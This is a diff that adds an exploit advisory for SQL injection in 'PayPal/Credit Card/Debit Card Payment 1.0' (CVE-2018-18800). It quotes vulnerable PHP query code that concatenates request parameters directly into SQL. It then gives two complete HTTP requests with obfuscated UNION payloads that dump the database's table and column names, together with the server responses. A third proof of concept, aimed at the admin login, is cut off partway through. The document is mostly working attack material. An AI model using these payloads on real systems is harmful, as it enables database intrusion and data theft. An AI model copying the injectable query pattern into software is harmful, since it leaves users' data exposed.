@@ -1,0 +1,104 @@
+# Exploit Title: PayPal/Credit Card/Debit Card Payment 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/tubigangarden.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18800
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?p=accomodation&q=[SQL]
+# 
+#[PATH]/accomodation.php
+#...
+#50  $query = "SELECT * FROM `tblroom` r ,`tblaccomodation` a WHERE r.`ACCOMID`=a.`ACCOMID` AND `ACCOMODATION`='" . $_GET['q'] . "' AND `NUMPERSON` = " . $_POST['person'];
+#51     
+#52 
+#53 }elseif(isset($_GET['q'])){
+#54 
+#55     $query = "SELECT * FROM `tblroom` r ,`tblaccomodation` a WHERE r.`ACCOMID`=a.`ACCOMID` AND `ACCOMODATION`='" . $_GET['q'] . "'"; 
+#56    
+#57  
+#58   
+#59   }
+#60 
+#61    $accomodation = ' | ' . $_GET['q'];
+#62   ?>
+#...
+GET /[PATH]/index.php?p=accomodation&q=-Standard%20Room%27%20%20UNION(SELECT(1),(2),(3),(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x),(5),(6),(7),(8),(9),(10),(11),(12))--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=mrht5eahsjgrpgldk6c455ncm3
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 28 Oct 2018 19:55:17 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/index.php?p=rooms&q=[SQL]
+# 
+#[PATH]/room_rates.php
+#...
+#50  $query = "SELECT * FROM `tblroom` r ,`tblaccomodation` a WHERE r.`ACCOMID`=a.`ACCOMID`   AND `NUMPERSON` = " . $_POST['person'];
+#51     
+#52 
+#53 }elseif(isset($_GET['q'])){
+#54 
+#55     $query = "SELECT * FROM `tblroom` r ,`tblaccomodation` a WHERE r.`ACCOMID`=a.`ACCOMID` AND `ROOM` LIKE '%" . $_GET['q'] . "%'"; 
+#56    
+#57   
+#58   }else{
+#59      $query = "SELECT * FROM `tblroom` r ,`tblaccomodation` a WHERE r.`ACCOMID`=a.`ACCOMID`";
+#60   }
+#61 
+#62    $accomodation = ' | ' . @$_GET['q'];
+#63   ?>
+#...
+GET /[PATH]/index.php?p=rooms&q=RM%20223%27%20%20UNION(SELECT(1),(2),(3),(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x),(5),(6),(7),(8),(9),(10),(11),(12))--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=mrht5eahsjgrpgldk6c455ncm3
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 28 Oct 2018 19:58:47 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/admin/login.php
+# 
+#[PATH]/admin/login.php
+#...
+#58 if (isset($_POST['btnlogin'])) {
+#59 //form has been submitted1
+#60     
+#61 $uname = trim($_POST['email']);
+#62 $upass = trim($_POST['pass']);
+#...
